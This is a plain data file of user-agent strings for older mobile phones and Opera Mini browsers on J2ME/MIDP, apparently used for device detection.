		Nokia6108/1.0 (04.02) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6108/1.0 (05.04) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6108/1.0 (05.30) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6108/1.0 (05.30) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/6.3.0.0.0 
		Nokia6170/2.0 (03.22) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6170/2.0 (03.24) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6220/2.0 (5.15) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6220/2.0 (6.29) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6220/2.0 (6.34) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6220/2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6230/2.0 (03.15) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230/2.0 (04.28) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230/2.0 (04.43) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230/2.0 (05.24) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230/2.0 (05.35) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230/2.0 (05.50) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230i/2.0 (03.25) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230i/2.0 (03.30) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6230i/2.0 (03.40) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6610/1.0 (3.09) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610/1.0 (4.18) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610/1.0 (4.28) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610/1.0 (4.74) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610/1.0 (5.52) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610/1.0 (5.63) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610/1.0 (5.65) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610I/1.0 (3.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610I/1.0 (4.20) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6820/2.0 (3.21) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6820/2.0 (3.70) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6820/2.0 (3.71) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6820/2.0 (4.22) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6820/2.0 (4.25) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; 
		Nokia6820/2.0 (5.30) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7200/2.0 (3.100) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7200/2.0 (3.110) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7200/2.0 (4.26) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (3.08) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (3.09) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (4.18) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (4.28) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (4.74) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (5.52) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (5.62) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (5.63) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7210/1.0 (5.65) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7250/1.0 (3.12) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7250/1.0 (3.62) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7250I/1.0 (3.22) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7250I/1.0 (4.22) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7250I/1.0 (4.63) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7250I/1.0 (5.30) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7260/2.0 (03.31) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia7260/2.0 (03.36) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia7260/2.0 (04.31) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia7260/2.0 (04.81) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia7260/2.0 (04.91) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia7270/2.0 (03.22) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia7270/2.0 (03.22) Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/5.1.2.6 
		Nokia7270/2.0 (03.24) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia7600/2.0 (04.05) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7600/2.0 (04.07) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia8800/2.0 (03.28) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia8800/2.0 (03.60) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		NokiaN70-1/2.0539.1.2 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		NokiaN70/3.0544.5.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		NokiaN90-1/2.0530.3.5/SN356633000161206 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		NokiaN90-1/3.0535.4.3 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Panasonic-A500/R1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Panasonic-X200P/RP1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Panasonic-X400P/RP1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonJ300c/R2AT SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonJ300c/R2AZ SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK300c/R2AJ SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK300c/R2AL SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK300c/R2BA SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK500c/R2AA SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK500c/R2AE SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK500c/R2L SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK500i/R2AA SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK500i/R2AE SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/1.1 
		SonyEricssonK506c/R2AA SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK506c/R2AT SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK508c/R2AA SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK508c/R2AE SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK508c/R2AT SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK508i/R2AE SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700c/R2AA SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700c/R2AE SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700c/R2AY SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700c/R2L SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700i/R2AE SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700i/R2AL SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700i/R2AY SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700i/R2L SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750c/R1C Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750c/R1J Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750c/R1L Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750c/R1L/SN356551004777951 Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 
		SonyEricssonK750c/R1L/SN356552009010810 Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 
		SonyEricssonK750i/R1J Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750i/R1J/SN356551006090544 Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 
		SonyEricssonK750i/R1L/SN356552002939080 Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 
		SonyEricssonK758c/R1L Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonP800/R101 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonS700c/R3B SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonS700c/R3F SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonS700c/R3G SEMC-Browser/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonS700c/R3K SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonS700c/R3M SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonS700i/R3B SEMC-Browser/4.0.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK700c/R2CA SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK500c/R2AT SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonJ300c/R2BA SEMC-Browser/4.0.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonW800c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonW800c/R1AA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonW700c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonW700c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK750c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonT610/R401 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT618/R101 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT618/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT618/R301 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT618/R401 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT618/R501 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT618/R601 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT628/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT628/R401 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT628/R501 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT628/R601 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT630/R401 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		SonyEricssonT630/R401 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/1.1 
		SonyEricssonW550c/R4AB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonW800c/R1L Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonW800c/R1N/SN356828009494240 Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 
		SonyEricssonZ608/R401 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Toplux AG280 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-L7/NA.ACR_RB MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-L7/08.D5.09R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-L6i/0A.64.19R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-L6/0A.60.1BR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		SAMSUNG-C5212/C5212XDIK1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK800c/R8BF Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK530i/R6BA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK530c/R8BA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SonyEricssonK510c/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.334; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (J2ME/23.377; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (J2ME/22.478; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/6.5.26955/27.1407; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/6.24288/25.729; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/6.24093/26.1305; U; en) Presto/2.8.119 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/6.24093/25.657; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/6.1.25378/25.677; U; th) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.22296/22.87; U; fr) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.22296/22.87; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.22296/22.478; U; fr) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.22296/22.387; U; fr) Presto/2.5.25 Version/10.54 
		Opera/9.50 (J2ME/MIDP; Opera Mini/5.1.21965/20.2513; U; en) 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21415/22.387; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80(J2ME/MIDP; Opera Mini/5.1.21214/22.414; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/22.414; U; ro) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/22.387; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21051/27.1573; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21051/23.377; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21051/20.2477; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.3521/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.3521/22.414; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.3521/18.684; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.20873/19.916; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19693Mod.by.Handler/23.390; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19693Mod.by.Handler/18.794; U; id) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19693/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19683/1278; U; ko) Presto/2.2.0 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741Mod.by.Handler/22.414; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; id) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; fr) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/18.794; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18635Mod.by.Handler/23.377; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18635/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.17443/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.17443/20.2477; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.17381/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823Mod.by.Handler/22.387; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.15650/20.2479; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.0.862 Profile/24.743; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.0.423 Profile/18.684; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.0.351 Profile/22.478; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.33867/35.2883; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.Vista/19.916; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.29476/27.1573; U; id) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.26736/28.2647; U; it) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.0.60 (Windows XP)/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.24214/27.1407; U; id) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.13337/25.657; U; ro) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.24721/30.3316; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.23453/28.2647; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.21465/22.478; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.21465/22.387; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.19634/23.333; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.18887/22.478; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.16320/29.3594; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.16007Mod.by.Handler/23.390; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410QUAIN/22.478; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.334; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.333; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/22.401; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2485; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/18.678; U; en) Presto/2.4.15 
		Opera/9.60 (J2ME/MIDP;Opera Mini/4.2.15410Mod.by.Handler/503; U; en)Presto/2.2.0 
		Opera/9.50 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2590; U; en) 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410/24.899; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410/22.394; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15066/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912mod.By.onome/22.401; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912Mod.by.Handler/24.783; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912Mod.by.Handler/23.377; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912Mod.By.www.9jamusic.cz.cc/22.387; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/870; U; id) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/24.746; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.334; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.333; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/22.394; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14885/20.2485; U; zh) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14881Mod.by.Handler/24.743; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14881Mod.by.Handler/23.317; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14753/20.2485; U; zh) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14409/20.2485; U; zh) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14320/886; U; id) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14320/22.478; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14320/20.2485; U; zh) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13943/20.2485; U; zh) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/22.414; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13400/20.2485; U; zh) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337.Mod.by.Handler/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337/19.916; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13265/870; U; ro) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13221/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13221/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13057/870; U; ja) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.2 19.42.55/19.892; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.18061/27.1407; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.15082/870; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.15082/25.677; U; vi) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.15082/20.2489; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.14287/22.387; U; id) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.13907/21.529; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.13573/20.2485; U; zh) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.12965/19.892; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.11321/24.871; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.8462/22.414; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.8462/19.916; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.10247/19.916; U; en) Presto/2.5.25 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.10031/22.453; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/886; U; en) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/870; U; id) Presto/2.4.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.453; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.401; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.394; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (Linux; U; 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.12 [en]/24.838; U; en) Presto/2.5.25 Version/10.54 
